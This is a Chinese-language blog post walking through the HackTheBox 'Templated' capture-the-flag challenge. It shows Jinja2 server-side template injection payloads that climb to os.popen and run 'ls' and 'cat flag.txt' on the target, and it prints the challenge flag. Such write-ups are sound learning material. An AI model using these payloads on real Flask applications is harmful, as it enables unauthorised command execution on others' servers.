---
layout: post
title: HTB-Easy-Templated
excerpt: "第三道HTB题目,解题过程"
date:   2021-05-11 19:51:00
categories: [HackTheBox]
comments: true
---

## 解题步骤

1. 题目描述：Can you exploit this simple mistake?

2. 访问目标网站，发现是基于Flask/Jinja2/Python的网站，该框架最出名的是模板注入漏洞

   ![image-20210511195230617](https://monkeydatabase.github.io/img/image-20210511195230617.png)

3. 检查Cookie，本次网站没有使用Cookie

4. 直接尝试模板注入漏洞，访问http://ip:port/\{\{"".\_\_class\_\_\}\}，顺利执行，响应体如下

   ```shell
   Error 404
   The page '<class 'str'>' could not be found
   ```

5. 获取目前的object类及其可触达的子类，访问http://ip:port/\{\{"".\_\_class\_\_.\_\_base\_\_[0].\_\_subclasses__()\}\}

   ![image-20210511202601170](https://monkeydatabase.github.io/img/image-20210511202601170.png)

6. 从其中寻找os模块，运行结果为133  \<class 'os._wrap_close'\>

   ```python
   sub = "将第五步里的所有模块粘贴到这里"
   sub = sub.split(',')
   print(sub)
   
   for i, item in enumerate(sub):
       if "os." in item:
           print(i, item)
   ```

7. 通过os模块进行任意命令执行，访问http://ip:port/\{\{"".\_\_class__.__bases\_\_[0].\_\_subclasses\_\_()[133].\_\_init\_\_.\_\_globals\_\_\['popen'\]('ls').read()\}\}，发现flag文件

   ```tex
   Error 404
   The page 'bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ' could not be found
   ```

8. 读取flag文件，访问http://ip:port/\{\{"".\_\_class__.__bases\_\_[0].\_\_subclasses\_\_()[133].\_\_init\_\_.\_\_globals\_\_\['popen'\]('cat flag.txt').read()\}\}，发现flag文件

   ```shell
   Error 404
   The page 'HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} ' could not be found
   ```

9. 发现flag，HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}

## 独立思考

由于之前接触过Flask的SSTI，没有太多疑问

## 产生过的疑问

由于之前接触过Flask的SSTI，没有太多疑问